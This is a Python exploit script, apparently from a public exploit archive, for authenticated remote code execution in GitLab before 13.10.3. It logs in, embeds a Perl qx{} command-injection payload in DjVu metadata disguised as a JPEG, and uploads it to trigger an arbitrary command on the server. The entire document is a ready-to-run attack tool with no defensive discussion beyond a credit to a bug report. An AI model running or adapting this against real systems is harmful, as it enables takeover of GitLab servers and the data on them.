# Exploit Title: Gitlab 13.10.2 - Remote Code Execution (Authenticated)
# Date: 04/06/2021
# Exploit Author: enox
# Vendor Homepage: https://about.gitlab.com/
# Software Link: https://gitlab.com/
# Version: < 13.10.3
# Tested On: Ubuntu 20.04
# Environment: Gitlab 13.10.2 CE
# Credits: https://hackerone.com/reports/1154542

import requests
from bs4 import BeautifulSoup
import random
import os
import argparse

parser = argparse.ArgumentParser(description='GitLab < 13.10.3 RCE')
parser.add_argument('-u', help='Username', required=True)
parser.add_argument('-p', help='Password', required=True)
parser.add_argument('-c', help='Command', required=True)
parser.add_argument('-t', help='URL (Eg: http://gitlab.example.com)', required=True)
args = parser.parse_args()

username = args.u
password = args.p
gitlab_url = args.t
command = args.c

session = requests.Session()

# Authenticating
print("[1] Authenticating")
r = session.get(gitlab_url + "/users/sign_in")
soup = BeautifulSoup(r.text, features="lxml")
token = soup.findAll('meta')[16].get("content")

login_form = {
    "authenticity_token": token,
    "user[login]": username,
    "user[password]": password,
    "user[remember_me]": "0"
}
r = session.post(f"{gitlab_url}/users/sign_in", data=login_form)

if r.status_code != 200:
    exit(f"Login Failed:{r.text}")
else:
    print("Successfully Authenticated")


# payload creation
print("[2] Creating Payload ")

payload = f"\" . qx{{{command}}} . \\\n"
f1 = open("/tmp/exploit","w")
f1.write('(metadata\n')
f1.write('        (Copyright "\\\n')
f1.write(payload)
f1.write('" b ") )')
f1.close()

# Checking if djvumake is installed
check = os.popen('which djvumake').read()
if (check == ""):
    exit("djvumake not installed. Install by running command : sudo apt install djvulibre-bin")

# Building the payload
os.system('djvumake /tmp/exploit.jpg INFO=0,0 BGjp=/dev/null ANTa=/tmp/exploit')


# Uploading it
print("[3] Creating Snippet and Uploading")

# Getting the CSRF token
r = session.get(gitlab_url + "/users/sign_in")
soup = BeautifulSoup(r.text, features="lxml")
csrf = soup.findAll('meta')[16].get("content")


cookies = {'_gitlab_session': session.cookies['_gitlab_session']}
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);',
    'Accept': 'application/json',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': f'{gitlab_url}/projects',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
    'X-Requested-With': 'XMLHttpRequest',
    'X-CSRF-Token': f'{csrf}'
}
files = {'file': ('exploit.jpg', open('/tmp/exploit.jpg', 'rb'), 'image/jpeg', {'Expires': '0'})}

r = session.post(gitlab_url+'/uploads/user', files=files, cookies=cookies, headers=headers, verify=False)

if r.text != "Failed to process image\n":
    exit("[-] Exploit failed")
else:
    print("[+] RCE Triggered !!")